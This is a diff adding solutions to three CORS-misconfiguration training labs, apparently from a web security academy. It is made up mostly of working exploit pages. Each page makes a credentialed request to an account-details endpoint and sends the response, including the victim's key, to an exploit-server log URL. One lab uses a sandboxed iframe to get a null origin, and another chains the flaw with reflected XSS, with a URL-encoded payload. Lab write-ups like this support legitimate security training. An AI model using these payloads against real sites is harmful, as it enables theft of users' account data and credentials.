@@ -1,0 +1,88 @@
+Lab 1:
+Response:
+Access-Control-Allow-Origin: https://abc.net
+Access-Control-Allow-Credentials: true
+
+Solution:
+<html>
+<body>
+  <script>
+    var req = new XMLHttpRequest();
+    var url = ""
+    req.onreadystatechange = function(){
+      if (req.readyState == XMLHttpRequest.DONE){
+        fetch("/log?key=" + req.responseText)
+      }
+    }
+    req.open('GET', url + "/accountDetails", true);
+    req.withCredentials = true;
+    req.send(null);
+  </script>
+</body>
+</html>
+
+--------------------------------------------------------------------------------
+Lab 2:
+Response:
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+
+Solution:
+<html>
+<body>
+<iframe style="display:none;" sandbox="allow-scripts" srcdoc="
+  <script>
+    var req = new XMLHttpRequest();
+    var url = 'https://0ab200cb0485cd9ec00922be008b0023.web-security-academy.net'
+    req.onreadystatechange = function(){
+      if (req.readyState == XMLHttpRequest.DONE){
+        fetch('https://exploit-0ac2009b04b8cdb8c084217701580009.exploit-server.net/log?key=' + req.responseText)
+      }
+    }
+    req.open('GET', url + '/accountDetails', true);
+    req.withCredentials = true;
+    req.send(null);
+  </script>">
+</body>
+</html>
+
+--------------------------------------------------------------------------------
+Lab 3:
+
+Origin: https://example.com.0a6200e203b46244c03f9fed00d10010.web-security-academy.net
+
+Response:
+Access-Control-Allow-Origin: https://example.com.0a6200e203b46244c03f9fed00d10010.web-security-academy.net
+Access-Control-Allow-Credentials: true
+
+Solution:
+<html>
+<body>
+  <script>
+    document.location='http://stock.0a6200e203b46244c03f9fed00d10010.web-security-academy.net/?productId=<script>
+      var req = new XMLHttpRequest();
+      var url = 'https://0a6200e203b46244c03f9fed00d10010.web-security-academy.net'
+      req.onreadystatechange = function(){
+        if (req.readyState == XMLHttpRequest.DONE){
+          fetch('https://exploit-0afc00f6030e62b3c0559e47014300b2.exploit-server.net/log?key=' + req.responseText)
+        }
+      }
+      req.open('GET', url + "/accountDetails", true);
+      req.withCredentials = true;
+      req.send(null);
+    </script>&storeId=3'
+  </script>
+</body>
+</html>
+
+<html>
+<body>
+  <script>
+    document.location='http://stock.0a6200e203b46244c03f9fed00d10010.web-security-academy.net/?productId=%3Cscript%3E%3Bvar%20req%3Dnew%20XMLHttpRequest%28%29%2Curl%3D%27https%3A%2F%2F0a6200e203b46244c03f9fed00d10010.web-security-academy.net%27%3Breq.onreadystatechange%3Dfunction%28%29%7Bif%28req.readyState%3D%3DXMLHttpRequest.DONE%29%7Bfetch%28%27https%3A%2F%2Fexploit-0afc00f6030e62b3c0559e47014300b2.exploit-server.net%2Flog%3Fkey%3D%27%2Breq.responseText%29%7D%7D%3Breq.open%28%27GET%27%2Curl%2B%27%2FaccountDetails%27%2C%210%29%3Breq.withCredentials%3D%210%3Breq.send%28null%29%3B%3C%2Fscript%3E&storeId=3'
+  </script>
+</body>
+</html>
+
+
+Note -- If the "Access-Control-Allow-Origin" allows any subdomain with any check we need to chain the CORS vulnerability with any other vulnerability like XSS from the particular subdomain.
+--------------------------------------------------------------------------------
